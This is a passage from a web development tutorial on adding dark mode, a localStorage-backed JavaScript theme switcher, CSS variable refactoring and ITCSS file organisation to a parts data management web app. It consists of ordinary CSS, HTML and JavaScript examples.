- 4B.4: Implementing the Design System ✓ (from previous)
- **4B.5: Dark Mode Implementation**
- **4B.6: Theme Switcher with JavaScript**
- **4B.7: Refactoring Existing CSS (The Big Migration)**
- **4B.8: CSS Architecture Patterns**
- **4B.9: Developer Tools & Shortcuts**
- **4B.10: Accessibility & Testing**

---

## 4B.5: Dark Mode Implementation

### Understanding Dark Mode

**Dark mode** isn't just inverting colors. It requires careful thought about:

- Reduced eye strain (less blue light)
- Contrast ratios (still need WCAG compliance)
- Colors appear differently on dark backgrounds
- Depth perception (shadows work differently)

### Dark Mode Color Theory

**On white background:**

```
Light colors = recede (backgrounds)
Dark colors = advance (text)
```

**On dark background:**

```
Dark colors = recede (backgrounds)
Light colors = advance (text)
BUT: Pure white (#fff) is too harsh!
```

**Best practices:**

- Background: Not pure black, use `#121212` or `hsl(240, 6%, 10%)`
- Text: Not pure white, use `#e0e0e0` or `hsl(240, 5%, 90%)`
- Reduce saturation: Colors should be slightly muted
- Increase elevation: Use shadows/borders for depth

### Dark Theme Tokens

Add to `backend/static/css/tokens.css`:

```css
/**
 * Dark Theme
 * 
 * Applied when [data-theme="dark"] is set on <html> element.
 * 
 * Strategy: Only override SEMANTIC tokens, not primitives.
 * This ensures both themes use the same color palette,
 * maintaining brand consistency.
 */

[data-theme="dark"] {
  /* ==========================================
     TIER 2: SEMANTIC TOKENS (Dark Mode)
     Only these change - primitives stay the same
     ========================================== */

  /* ----- Text Colors ----- 
     Inverted hierarchy: light text on dark background */
  --text-primary: var(--color-gray-100); /* Was gray-900 */
  --text-secondary: var(--color-gray-400); /* Was gray-600 */
  --text-tertiary: var(--color-gray-500); /* Same - middle gray */
  --text-disabled: var(--color-gray-600); /* Was gray-400 */
  --text-inverse: var(--color-gray-900); /* Was white */

  /* Links - slightly brighter in dark mode for contrast */
  --text-link: var(--color-primary-400); /* Was primary-600 */
  --text-link-hover: var(--color-primary-300); /* Was primary-700 */

  /* ----- Background Colors ----- 
     Dark backgrounds, subtle variations for depth */
  --bg-primary: var(--color-gray-900); /* Main background */
  --bg-secondary: var(--color-gray-800); /* Slightly elevated */
  --bg-tertiary: var(--color-gray-700); /* Cards, panels */
  --bg-inverse: var(--color-gray-50); /* Light sections */
  --bg-overlay: rgba(0, 0, 0, 0.7); /* Darker overlay */

  /* ----- Border Colors ----- 
     Lighter borders for visibility on dark */
  --border-default: var(--color-gray-700); /* Was gray-200 */
  --border-strong: var(--color-gray-600); /* Was gray-300 */
  --border-subtle: var(--color-gray-800); /* Was gray-100 */
  --border-focus: var(--color-primary-400); /* Brighter for visibility */

  /* ----- Interactive States ----- 
     Slightly lighter for better contrast */
  --interactive-primary: var(--color-primary-500); /* Same base */
  --interactive-primary-hover: var(--color-primary-400); /* Lighter on hover */
  --interactive-primary-active: var(--color-primary-300); /* Even lighter */
  --interactive-primary-disabled: var(--color-gray-700);

  /* ----- Status Colors ----- 
     Adjusted for dark background visibility */

  /* Success - Green */
  --status-success: var(--color-success-400); /* Lighter green */
  --status-success-bg: hsl(145, 40%, 15%); /* Darkened background */
  --status-success-border: var(--color-success-700);
  --status-success-text: var(--color-success-200);

  /* Warning - Amber */
  --status-warning: var(--color-warning-400);
  --status-warning-bg: hsl(38, 50%, 15%);
  --status-warning-border: var(--color-warning-700);
  --status-warning-text: var(--color-warning-200);

  /* Danger - Red */
  --status-danger: var(--color-danger-400);
  --status-danger-bg: hsl(0, 50%, 15%);
  --status-danger-border: var(--color-danger-700);
  --status-danger-text: var(--color-danger-200);

  /* Info - Blue */
  --status-info: var(--color-info-400);
  --status-info-bg: hsl(200, 50%, 15%);
  --status-info-border: var(--color-info-700);
  --status-info-text: var(--color-info-200);

  /* ==========================================
     TIER 3: COMPONENT TOKENS (Dark Mode Adjustments)
     Only override if component needs dark-specific changes
     ========================================== */

  /* ----- Inputs ----- 
     Dark mode inputs need different focus treatment */
  --input-bg: var(--color-gray-800);
  --input-border: var(--color-gray-600);
  --input-border-focus: var(--color-primary-400);
  --input-text: var(--text-primary);
  --input-placeholder: var(--text-tertiary);
  --input-focus-shadow: 0 0 0 3px rgba(102, 126, 234, 0.3); /* Brighter glow */

  /* ----- Cards ----- 
     Elevated surfaces in dark mode */
  --card-bg: var(--bg-tertiary);
  --card-border: var(--border-subtle);
  --card-shadow: var(--shadow-lg); /* Stronger shadows for depth */

  /* ----- Modals ----- */
  --modal-bg: var(--color-gray-800);
  --modal-shadow: var(--shadow-xl);
  --modal-backdrop: rgba(0, 0, 0, 0.8); /* Darker backdrop */

  /* ----- Shadows (Dark Mode Specific) ----- 
     In dark mode, shadows need to be lighter/subtler
     because we're creating depth with light, not darkness */
  --shadow-xs: 0 1px 2px 0 rgba(0, 0, 0, 0.3);
  --shadow-sm: 0 2px 4px 0 rgba(0, 0, 0, 0.4);
  --shadow-base: 0 4px 8px 0 rgba(0, 0, 0, 0.5);
  --shadow-md: 0 6px 12px 0 rgba(0, 0, 0, 0.6);
  --shadow-lg: 0 10px 20px 0 rgba(0, 0, 0, 0.7);
  --shadow-xl: 0 20px 40px 0 rgba(0, 0, 0, 0.8);
}
```

### Dark Mode Specific Considerations

**1. Color Saturation Adjustment**

Colors appear more vibrant on dark backgrounds. Reduce saturation slightly:

```css
/* Light mode - full saturation */
:root {
  --color-primary-500: hsl(245, 70%, 55%);
}

/* Dark mode - slightly reduced */
[data-theme="dark"] {
  /* Override primitive for dark mode */
  --color-primary-500: hsl(245, 60%, 55%); /* 70% → 60% saturation */
}
```

**2. Avoid Pure Black and Pure White**

```css
/* ❌ BAD - too harsh */
[data-theme="dark"] {
  --bg-primary: #000000;
  --text-primary: #ffffff;
}

/* ✅ GOOD - softer on eyes */
[data-theme="dark"] {
  --bg-primary: hsl(240, 6%, 10%); /* Almost black, slight color */
  --text-primary: hsl(240, 5%, 90%); /* Almost white, not glaring */
}
```

**3. Depth with Elevation, Not Just Shadows**

```css
/* Dark mode elevation system */
[data-theme="dark"] {
  /* Base surface */
  --surface-0: var(--color-gray-900); /* 10% lightness */

  /* Each level is slightly lighter */
  --surface-1: var(--color-gray-850); /* 12% lightness */
  --surface-2: var(--color-gray-800); /* 15% lightness */
  --surface-3: var(--color-gray-750); /* 18% lightness */
}

/* Applied to components */
.page {
  background: var(--surface-0);
}
.card {
  background: var(--surface-1);
}
.card-elevated {
  background: var(--surface-2);
}
```

---

## 4B.6: Theme Switcher with JavaScript

### Detecting System Preference

**Modern browsers expose user's OS theme preference:**

```javascript
// Detect if user prefers dark mode
const prefersDark = window.matchMedia("(prefers-color-scheme: dark)").matches;

console.log(prefersDark); // true or false
```

**Listen for changes:**

```javascript
// User changes system theme while app is open
window
  .matchMedia("(prefers-color-scheme: dark)")
  .addEventListener("change", (e) => {
    const newColorScheme = e.matches ? "dark" : "light";
    console.log(`System theme changed to: ${newColorScheme}`);
  });
```

### Theme Management System

Create `backend/static/js/theme.js`:

```javascript
/**
 * Theme Management System
 *
 * Handles:
 * - Detecting system preference
 * - Storing user choice in localStorage
 * - Applying theme to document
 * - Smooth transitions between themes
 * - Respecting user's explicit choice over system preference
 *
 * Usage:
 *   import ThemeManager from './theme.js';
 *   const theme = new ThemeManager();
 *   theme.setTheme('dark');
 */

class ThemeManager {
  constructor() {
    this.STORAGE_KEY = "pdm-theme-preference";
    this.THEME_ATTRIBUTE = "data-theme";

    // Available themes
    this.themes = {
      LIGHT: "light",
      DARK: "dark",
      AUTO: "auto",
    };

    // Initialize theme on creation
    this.init();
  }

  /**
   * Initialize theme system
   *
   * Priority:
   * 1. User's explicit choice (localStorage)
   * 2. System preference (prefers-color-scheme)
   * 3. Default to light
   */
  init() {
    console.log("ThemeManager: Initializing...");

    // Get stored preference
    const stored = this.getStoredPreference();

    if (stored && stored !== this.themes.AUTO) {
      // User has explicit preference - use it
      this.applyTheme(stored);
      console.log(`ThemeManager: Applying stored preference: ${stored}`);
    } else {
      // No preference or set to AUTO - use system
      const systemTheme = this.getSystemPreference();
      this.applyTheme(systemTheme);
      console.log(`ThemeManager: Applying system preference: ${systemTheme}`);
    }

    // Listen for system theme changes
    this.watchSystemPreference();
  }

  /**
   * Get theme from localStorage
   */
  getStoredPreference() {
    try {
      return localStorage.getItem(this.STORAGE_KEY);
    } catch (e) {
      console.warn("ThemeManager: localStorage unavailable", e);
      return null;
    }
  }

  /**
   * Save theme to localStorage
   */
  setStoredPreference(theme) {
    try {
      localStorage.setItem(this.STORAGE_KEY, theme);
      console.log(`ThemeManager: Saved preference: ${theme}`);
    } catch (e) {
      console.warn("ThemeManager: Failed to save preference", e);
    }
  }

  /**
   * Get system theme preference
   */
  getSystemPreference() {
    // Check if browser supports prefers-color-scheme
    if (window.matchMedia) {
      const prefersDark = window.matchMedia(
        "(prefers-color-scheme: dark)"
      ).matches;
      return prefersDark ? this.themes.DARK : this.themes.LIGHT;
    }

    // Fallback to light if not supported
    return this.themes.LIGHT;
  }

  /**
   * Watch for system preference changes
   */
  watchSystemPreference() {
    if (!window.matchMedia) return;

    const mediaQuery = window.matchMedia("(prefers-color-scheme: dark)");

    // Modern browsers
    if (mediaQuery.addEventListener) {
      mediaQuery.addEventListener("change", (e) => {
        console.log("ThemeManager: System preference changed");

        // Only auto-switch if user hasn't set explicit preference
        const stored = this.getStoredPreference();
        if (!stored || stored === this.themes.AUTO) {
          const newTheme = e.matches ? this.themes.DARK : this.themes.LIGHT;
          this.applyTheme(newTheme);
        }
      });
    }
    // Legacy browsers
    else if (mediaQuery.addListener) {
      mediaQuery.addListener((e) => {
        const stored = this.getStoredPreference();
        if (!stored || stored === this.themes.AUTO) {
          const newTheme = e.matches ? this.themes.DARK : this.themes.LIGHT;
          this.applyTheme(newTheme);
        }
      });
    }
  }

  /**
   * Apply theme to document
   *
   * This is the core function that actually changes the theme.
   * It sets the data-theme attribute on <html> which triggers
   * our CSS variables to switch.
   */
  applyTheme(theme) {
    // Validate theme
    if (!Object.values(this.themes).includes(theme)) {
      console.warn(`ThemeManager: Invalid theme "${theme}", using light`);
      theme = this.themes.LIGHT;
    }

    // Resolve AUTO to actual theme
    if (theme === this.themes.AUTO) {
      theme = this.getSystemPreference();
    }

    // Get html element
    const root = document.documentElement;

    // Add transition class (prevents flash on initial load)
    root.classList.add("theme-transition");

    // Set theme attribute
    root.setAttribute(this.THEME_ATTRIBUTE, theme);

    // Emit custom event for other components to react
    window.dispatchEvent(
      new CustomEvent("themechange", {
        detail: { theme },
      })
    );

    // Remove transition class after animation completes
    setTimeout(() => {
      root.classList.remove("theme-transition");
    }, 300);

    console.log(`ThemeManager: Applied theme: ${theme}`);
  }

  /**
   * Set theme (public API)
   *
   * @param {string} theme - 'light', 'dark', or 'auto'
   */
  setTheme(theme) {
    console.log(`ThemeManager: Setting theme to ${theme}`);

    // Save preference
    this.setStoredPreference(theme);

    // Apply theme
    this.applyTheme(theme);
  }

  /**
   * Get current active theme
   */
  getCurrentTheme() {
    const root = document.documentElement;
    return root.getAttribute(this.THEME_ATTRIBUTE) || this.themes.LIGHT;
  }

  /**
   * Toggle between light and dark
   */
  toggle() {
    const current = this.getCurrentTheme();
    const next =
      current === this.themes.LIGHT ? this.themes.DARK : this.themes.LIGHT;
    this.setTheme(next);
  }
}

// Create singleton instance
const themeManager = new ThemeManager();

// Export for use in other modules
export default themeManager;

// Also attach to window for non-module usage
window.themeManager = themeManager;
```

### Add Smooth Transitions

Add to `backend/static/css/style.css`:

```css
/**
 * Theme Transition
 * 
 * When theme changes, smoothly transition colors.
 * Only applied during theme switch (via JS), not on page load.
 */

html.theme-transition,
html.theme-transition *,
html.theme-transition *::before,
html.theme-transition *::after {
  transition: background-color var(--transition-base), border-color var(--transition-base),
    color var(--transition-base), fill var(--transition-base),
    stroke var(--transition-base) !important;
  transition-delay: 0s !important;
}

/**
 * Prevent transition flash on page load
 * 
 * Without this, page load would show a brief flash of the
 * transition animation as variables are set.
 */
html:not(.theme-transition) * {
  transition: none !important;
}
```

### Theme Switcher UI Component

Add to `backend/static/index.html` header:

```html
<header>
  <div class="header-content">
    <div>
      <h1>PDM System</h1>
      <p>Parts Data Management</p>
    </div>
    <div class="header-actions">
      <!-- Theme Switcher -->
      <button
        id="theme-toggle"
        class="btn btn-icon"
        aria-label="Toggle theme"
        title="Toggle light/dark mode"
      >
        <span class="theme-icon theme-icon-light">☀️</span>
        <span class="theme-icon theme-icon-dark">🌙</span>
      </button>

      <span id="connection-status" class="status-disconnected">
        🔴 Disconnected
      </span>

      <button
        id="admin-panel-btn"
        class="btn btn-secondary"
        style="display: none;"
      >
        Admin Panel
      </button>
      <button id="logout-btn" class="btn btn-secondary">Logout</button>
    </div>
  </div>
</header>
```

### Theme Toggle Button Styles

Add to `style.css`:

```css
/* ============================================
   THEME TOGGLE BUTTON
   ============================================ */

.btn-icon {
  /* Icon-only button - square shape */
  padding: var(--spacing-2);
  width: 2.5rem;
  height: 2.5rem;
  display: inline-flex;
  align-items: center;
  justify-content: center;
  background: var(--bg-tertiary);
  border: 1px solid var(--border-default);
  color: var(--text-primary);
  position: relative;
  overflow: hidden;
}

.btn-icon:hover {
  background: var(--bg-secondary);
  transform: none; /* Override default button transform */
}

/* Theme icons */
.theme-icon {
  position: absolute;
  font-size: 1.25rem;
  transition: transform var(--transition-base), opacity var(--transition-base);
}

/* Light theme - show moon icon */
:root .theme-icon-light {
  transform: translateY(0) rotate(0deg);
  opacity: 0;
}

:root .theme-icon-dark {
  transform: translateY(0) rotate(0deg);
  opacity: 1;
}

/* Dark theme - show sun icon */
[data-theme="dark"] .theme-icon-light {
  transform: translateY(0) rotate(180deg);
  opacity: 1;
}

[data-theme="dark"] .theme-icon-dark {
  transform: translateY(40px) rotate(180deg);
  opacity: 0;
}
```

### Wire Up Theme Toggle

Update `backend/static/js/app.js`:

```javascript
// Import theme manager (if using modules)
// import themeManager from './theme.js';

// Or access from window if not using modules
// const themeManager = window.themeManager;

document.addEventListener("DOMContentLoaded", function () {
  console.log("DOM fully loaded");

  // Theme toggle button
  const themeToggle = document.getElementById("theme-toggle");
  if (themeToggle) {
    themeToggle.addEventListener("click", () => {
      window.themeManager.toggle();
    });
  }

  // Listen for theme changes (optional - for analytics, etc.)
  window.addEventListener("themechange", (e) => {
    console.log("Theme changed to:", e.detail.theme);

    // Could send analytics event here
    // analytics.track('theme_changed', { theme: e.detail.theme });
  });

  // ... rest of your initialization code ...
});
```

### Load Theme Manager First

Update `index.html` to load theme.js BEFORE app.js:

```html
<!-- Load theme manager first to prevent flash -->
<script src="/static/js/theme.js"></script>

<!-- Then load main app -->
<script src="/static/js/app.js"></script>
```

**CRITICAL:** Theme.js must load BEFORE the page renders to prevent a "flash of unstyled content" (FOUC).

---

## 4B.7: Refactoring Existing CSS (The Big Migration)

### The Refactoring Strategy

**Don't rewrite everything at once!** Use incremental refactoring:

1. **Add new token system** ✓ (done)
2. **Refactor one component at a time**
3. **Test after each component**
4. **Delete old CSS once verified**

### Before You Start: Create a Backup

```bash
cd backend/static/css
cp style.css style.css.backup
```

### Developer Shortcut: Find & Replace Patterns

**VS Code Multi-Cursor Magic:**

1. Select a hardcoded color: `#667eea`
2. Press `Cmd+D` (Mac) or `Ctrl+D` (Windows) repeatedly
   - Selects next occurrence
3. Type replacement: `var(--interactive-primary)`
4. All instances replaced!

**Regex Find & Replace:**

Find: `#667eea`
Replace: `var(--interactive-primary)`

**But be careful!** Not all instances should use the same variable.

### Refactoring Component by Component

#### 1. Reset & Global Styles

**OLD:**

```css
body {
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen,
    Ubuntu, Cantarell, sans-serif;
  line-height: 1.6;
  color: #333;
  background-color: #f5f5f5;
}
```

**NEW:**

```css
body {
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen,
    Ubuntu, Cantarell, sans-serif;
  line-height: var(--line-height-base);
  color: var(--text-primary);
  background-color: var(--bg-primary);
}
```

#### 2. Header

**OLD:**

```css
header {
  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
  color: white;
  padding: 2rem;
  text-align: center;
  box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
}

header h1 {
  font-size: 2.5rem;
  margin-bottom: 0.5rem;
}

header p {
  font-size: 1.1rem;
  opacity: 0.9;
}
```

**NEW:**

```css
header {
  background: linear-gradient(
    135deg,
    var(--color-primary-500) 0%,
    var(--color-primary-700) 100%
  );
  color: var(--text-inverse);
  padding: var(--spacing-8);
  text-align: center;
  box-shadow: var(--shadow-md);
}

header h1 {
  font-size: var(--font-size-4xl);
  margin-bottom: var(--spacing-2);
  font-weight: var(--font-weight-bold);
}

header p {
  font-size: var(--font-size-lg);
  opacity: 0.9;
}
```

#### 3. Buttons (Most Important!)

**OLD:**

```css
.btn {
  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
  color: white;
  border: none;
  padding: 0.75rem 1.5rem;
  border-radius: 4px;
  font-size: 1rem;
  cursor: pointer;
  transition: all 0.3s ease;
  font-weight: 500;
}

.btn:hover {
  transform: translateY(-2px);
  box-shadow: 0 4px 12px rgba(102, 126, 234, 0.4);
}

.btn-secondary {
  background: #6c757d;
}

.btn-checkout {
  background: #28a745;
}

.btn-checkin {
  background: #ffc107;
  color: #333;
}

.btn-danger {
  background: #dc3545;
}
```

**NEW:**

```css
/* ============================================
   BUTTONS
   Component tokens make these maintainable
   ============================================ */

.btn {
  /* Use component tokens for all properties */
  background: var(--button-primary-bg);
  color: var(--button-primary-text);
  border: none;
  padding: var(--button-padding-y) var(--button-padding-x);
  border-radius: var(--button-border-radius);
  font-size: var(--button-font-size);
  font-weight: var(--button-font-weight);
  cursor: pointer;
  transition: var(--button-transition);

  /* Reset for consistency */
  display: inline-flex;
  align-items: center;
  justify-content: center;
  text-decoration: none;
  line-height: 1;
}

.btn:hover {
  background: var(--button-primary-bg-hover);
  transform: translateY(-2px);
  box-shadow: 0 4px 12px hsla(245, 70%, 55%, 0.4);
}

.btn:active {
  background: var(--button-primary-bg-active);
  transform: translateY(0);
}

.btn:disabled {
  background: var(--interactive-primary-disabled);
  cursor: not-allowed;
  opacity: 0.6;
}

/* Button variants - use semantic tokens */
.btn-secondary {
  background: var(--button-secondary-bg);
  color: var(--button-secondary-text);
}

.btn-secondary:hover {
  background: var(--button-secondary-bg-hover);
}

.btn-checkout {
  background: var(--status-success);
  color: var(--text-inverse);
}

.btn-checkout:hover {
  background: var(--color-success-600);
}

.btn-checkin {
  background: var(--status-warning);
  color: var(--color-gray-900); /* Dark text on amber */
}

.btn-checkin:hover {
  background: var(--color-warning-600);
}

.btn-danger {
  background: var(--status-danger);
  color: var(--text-inverse);
}

.btn-danger:hover {
  background: var(--color-danger-600);
}
```

#### 4. Forms

**OLD:**

```css
input[type="text"] {
  width: 100%;
  padding: 0.75rem;
  border: 1px solid #ddd;
  border-radius: 4px;
  font-size: 1rem;
  transition: border-color 0.3s ease;
}

input[type="text"]:focus {
  outline: none;
  border-color: #667eea;
  box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
}
```

**NEW:**

```css
input[type="text"],
input[type="email"],
input[type="password"],
textarea {
  width: 100%;
  padding: var(--input-padding-y) var(--input-padding-x);
  border: 1px solid var(--input-border);
  border-radius: var(--input-border-radius);
  font-size: var(--font-size-base);
  background: var(--input-bg);
  color: var(--input-text);
  transition: border-color var(--transition-fast), box-shadow var(--transition-fast);
}

input::placeholder,
textarea::placeholder {
  color: var(--input-placeholder);
}

input:focus,
textarea:focus {
  outline: none;
  border-color: var(--input-border-focus);
  box-shadow: var(--input-focus-shadow);
}
```

#### 5. Cards & Sections

**OLD:**

```css
section {
  background: white;
  padding: 2rem;
  border-radius: 8px;
  box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
  margin-bottom: 2rem;
}
```

**NEW:**

```css
section {
  background: var(--card-bg);
  padding: var(--card-padding);
  border-radius: var(--card-border-radius);
  box-shadow: var(--card-shadow);
  border: 1px solid var(--card-border);
  margin-bottom: var(--spacing-8);
}
```

#### 6. File List Items

**OLD:**

```css
.file-item {
  padding: 1rem;
  border: 1px solid #e0e0e0;
  border-radius: 4px;
  display: flex;
  justify-content: space-between;
  align-items: center;
  transition: all 0.3s ease;
}

.file-item:hover {
  background-color: #f9f9f9;
  border-color: #667eea;
  transform: translateX(5px);
}

.file-name {
  font-weight: 600;
  color: #333;
}

.status-available {
  background-color: #d4edda;
  color: #155724;
}

.status-checked_out {
  background-color: #fff3cd;
  color: #856404;
}
```

**NEW:**

```css
.file-item {
  padding: var(--spacing-4);
  border: 1px solid var(--border-default);
  border-radius: var(--radius-base);
  display: flex;
  justify-content: space-between;
  align-items: center;
  transition: all var(--transition-base);
  background: var(--bg-primary);
}

.file-item:hover {
  background-color: var(--bg-secondary);
  border-color: var(--interactive-primary);
  transform: translateX(5px);
}

.file-name {
  font-weight: var(--font-weight-semibold);
  color: var(--text-primary);
}

.file-status {
  padding: var(--spacing-1) var(--spacing-3);
  border-radius: var(--radius-full);
  font-size: var(--font-size-sm);
  font-weight: var(--font-weight-medium);
}

.status-available {
  background-color: var(--status-success-bg);
  color: var(--status-success-text);
  border: 1px solid var(--status-success-border);
}

.status-checked_out {
  background-color: var(--status-warning-bg);
  color: var(--status-warning-text);
  border: 1px solid var(--status-warning-border);
}
```

#### 7. Modals

**OLD:**

```css
.modal-overlay {
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background: rgba(0, 0, 0, 0.5);
  display: flex;
  justify-content: center;
  align-items: center;
  z-index: 1000;
  backdrop-filter: blur(2px);
}

.modal-content {
  background: white;
  border-radius: 8px;
  max-width: 500px;
  width: 90%;
  max-height: 90vh;
  overflow-y: auto;
  box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
}

.modal-header {
  padding: 1.5rem;
  border-bottom: 1px solid #e0e0e0;
}
```

**NEW:**

```css
.modal-overlay {
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background: var(--modal-backdrop);
  display: flex;
  justify-content: center;
  align-items: center;
  z-index: var(--z-modal-backdrop);
  backdrop-filter: blur(2px);
}

.modal-content {
  background: var(--modal-bg);
  border-radius: var(--modal-border-radius);
  max-width: 500px;
  width: 90%;
  max-height: 90vh;
  overflow-y: auto;
  box-shadow: var(--modal-shadow);
  border: 1px solid var(--border-default);
}

.modal-header {
  padding: var(--spacing-6);
  border-bottom: 1px solid var(--border-default);
  display: flex;
  justify-content: space-between;
  align-items: center;
}

.modal-header h3 {
  margin: 0;
  color: var(--text-primary);
  font-size: var(--font-size-2xl);
}

.modal-body {
  padding: var(--spacing-6);
}

.modal-close {
  background: none;
  border: none;
  font-size: var(--font-size-3xl);
  color: var(--text-secondary);
  cursor: pointer;
  padding: 0;
  width: 30px;
  height: 30px;
  display: flex;
  align-items: center;
  justify-content: center;
  border-radius: var(--radius-base);
  transition: background var(--transition-fast), color var(--transition-fast);
}

.modal-close:hover {
  background: var(--bg-secondary);
  color: var(--text-primary);
}
```

### Developer Shortcut: VS Code Snippets

Create `.vscode/css.code-snippets` in your project:

```json
{
  "Color Variable": {
    "prefix": "cvar",
    "body": ["var(--color-$1)"],
    "description": "Insert color variable"
  },
  "Spacing Variable": {
    "prefix": "svar",
    "body": ["var(--spacing-$1)"]
  },
  "Component Token": {
    "prefix": "tvar",
    "body": ["var(--$1-$2)"]
  }
}
```

Now type `cvar` + Tab → `var(--color-|)` (cursor at |)

### Automated Refactoring Script

For bulk replacements, create `refactor-css.js`:

```javascript
/**
 * CSS Refactoring Script
 *
 * Automatically replaces hardcoded values with CSS variables.
 *
 * Usage:
 *   node refactor-css.js style.css
 */

const fs = require("fs");

const replacements = {
  // Colors
  "#667eea": "var(--color-primary-500)",
  "#764ba2": "var(--color-primary-700)",
  "#28a745": "var(--status-success)",
  "#ffc107": "var(--status-warning)",
  "#dc3545": "var(--status-danger)",
  "#6c757d": "var(--color-gray-600)",
  "#333": "var(--text-primary)",
  "#666": "var(--text-secondary)",
  "#999": "var(--text-tertiary)",
  white: "var(--color-white)",
  "#f5f5f5": "var(--bg-secondary)",
  "#e0e0e0": "var(--border-default)",

  // Spacing (be careful with these!)
  "padding: 1rem": "padding: var(--spacing-4)",
  "padding: 2rem": "padding: var(--spacing-8)",
  "margin: 1rem": "margin: var(--spacing-4)",
  "gap: 1rem": "gap: var(--spacing-4)",

  // Border radius
  "border-radius: 4px": "border-radius: var(--radius-base)",
  "border-radius: 8px": "border-radius: var(--radius-md)",

  // Transitions
  "transition: all 0.3s ease": "transition: all var(--transition-base)",
};

function refactorCSS(filePath) {
  let content = fs.readFileSync(filePath, "utf8");

  Object.entries(replacements).forEach(([old, new_]) => {
    const regex = new RegExp(old.replace(/[.*+?^${}()|[\]\\]/g, "\\$&"), "g");
    content = content.replace(regex, new_);
  });

  // Write back
  fs.writeFileSync(filePath, content);
  console.log(`Refactored: ${filePath}`);
}

const filePath = process.argv[2];
if (!filePath) {
  console.log("Usage: node refactor-css.js <css-file>");
  process.exit(1);
}

refactorCSS(filePath);
```

**Run it:**

```bash
node refactor-css.js backend/static/css/style.css
```

**⚠️ WARNING:** Always review changes! Automated refactoring can make mistakes.

---

## 4B.8: CSS Architecture Patterns

### Why Architecture Matters

**Without structure:**

```css
/* style.css - 5000 lines */
.btn {
  ...;
}
.card {
  ...;
}
.modal {
  ...;
}
/* Everything in one file, no organization */
```

**With structure:**

```
css/
├── tokens.css          (Design system)
├── reset.css           (Browser normalization)
├── layout.css          (Page structure)
├── components/
│   ├── buttons.css
│   ├── forms.css
│   ├── modals.css
│   └── cards.css
└── utilities.css       (Helper classes)
```

### ITCSS (Inverted Triangle CSS)

**The industry-standard CSS architecture:**

```
   Wide reach, low specificity (affects everything)
   ↓
┌────────────────────────────┐
│  1. Settings (variables)   │  ← Tokens, no output
├────────────────────────────┤
│  2. Tools (mixins)         │  ← Functions, no output
├────────────────────────────┤
│  3. Generic (resets)       │  ← Normalize, box-sizing
├────────────────────────────┤
│  4. Elements (HTML tags)   │  ← h1, p, a (no classes)
├────────────────────────────┤
│  5. Objects (layout)       │  ← .container, .grid
├────────────────────────────┤
│  6. Components             │  ← .btn, .card, .modal
├────────────────────────────┤
│  7. Utilities              │  ← .text-center, .mt-4
└────────────────────────────┘
   ↑
   Narrow reach, high specificity (very specific)
```

**Key principle:** Specificity increases as you go down.

### Implementing ITCSS

**1. Settings (tokens.css)** ✓ Already done!

**2. Generic (reset.css)**

Create `backend/static/css/reset.css`:

```css
/**
 * Modern CSS Reset
 * Based on: https://github.com/Andy-set-studio/modern-css-reset
 */

/* Box sizing rules */
*,
*::before,
*::after {
  box-sizing: border-box;
}

/* Remove default margin */
body,
h1,
h2,
h3,
h4,
h5,
h6,
p,
figure,
blockquote,
dl,
dd {
  margin: 0;
}

/* Remove list styles on ul, ol elements with a list role */
ul[role="list"],
ol[role="list"] {
  list-style: none;
}

/* Set core root defaults */
html:focus-within {
  scroll-behavior: smooth;
}

/* Set core body defaults */
body {
  min-height: 100vh;
  text-rendering: optimizeSpeed;
  line-height: 1.5;
}

/* A elements that don't have a class get default styles */
a:not([class]) {
  text-decoration-skip-ink: auto;
}

/* Make images easier to work with */
img,
picture {
  max-width: 100%;
  display: block;
}

/* Inherit fonts for inputs and buttons */
input,
button,
textarea,
select {
  font: inherit;
}

/* Remove all animations and transitions for people who prefer not to see them */
@media (prefers-reduced-motion: reduce) {
  html:focus-within {
    scroll-behavior: auto;
  }

  *,
  *::before,
  *::after {
    animation-duration: 0.01ms !important;
    animation-iteration-count: 1 !important;
    transition-duration: 0.01ms !important;
    scroll-behavior: auto !important;
  }
}
```

**3. Elements (base.css)**

Create `backend/static/css/base.css`:

```css
/**
 * Base Element Styles
 * 
 * Styles for HTML elements (no classes).
 * These establish the default look.
 */

html {
  font-size: 16px; /* Base for rem calculations */
}

body {
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen,
    Ubuntu, Cantarell, sans-serif;
  line-height: var(--line-height-base);
  color: var(--text-primary);
  background-color: var(--bg-primary);
  -webkit-font-smoothing: antialiased;
  -moz-osx-font-smoothing: grayscale;
}

/* Headings */
h1,
h2,
h3,
h4,
h5,
h6 {
  font-weight: var(--font-weight-bold);
  line-height: var(--line-height-tight);
  color: var(--text-primary);
}

h1 {
  font-size: var(--font-size-4xl);
  margin-bottom: var(--spacing-4);
}
h2 {
  font-size: var(--font-size-3xl);
  margin-bottom: var(--spacing-4);
}
h3 {
  font-size: var(--font-size-2xl);
  margin-bottom: var(--spacing-3);
}
h4 {
  font-size: var(--font-size-xl);
  margin-bottom: var(--spacing-3);
}
h5 {
  font-size: var(--font-size-lg);
  margin-bottom: var(--spacing-2);
}
h6 {
  font-size: var(--font-size-base);
  margin-bottom: var(--spacing-2);
}

/* Paragraphs */
p {
  margin-bottom: var(--spacing-4);
}

/* Links */
a {
  color: var(--text-link);
  text-decoration: none;
  transition: color var(--transition-fast);
}

a:hover {
  color: var(--text-link-hover);
  text-decoration: underline;
}

/* Code */
code {
  font-family: "Courier New", monospace;
  background: var(--bg-tertiary);
  padding: 0.125rem 0.25rem;
  border-radius: var(--radius-sm);
  font-size: 0.875em;
}

pre {
  background: var(--bg-tertiary);
  padding: var(--spacing-4);
  border-radius: var(--radius-base);
  overflow-x: auto;
}

pre code {
  background: none;
  padding: 0;
}
```

**4. Objects (layout.css)**

Create `backend/static/css/layout.css`:

```css
/**
 * Layout Objects
 * 
 * Reusable layout patterns (no cosmetic styles).
 */

/* Container - centers content with max-width */
.container {
  max-width: 1200px;
  margin-left: auto;
  margin-right: auto;
  padding-left: var(--spacing-4);
  padding-right: var(--spacing-4);
}

/* Stack - vertical spacing */
.stack > * + * {
  margin-top: var(--spacing-4);
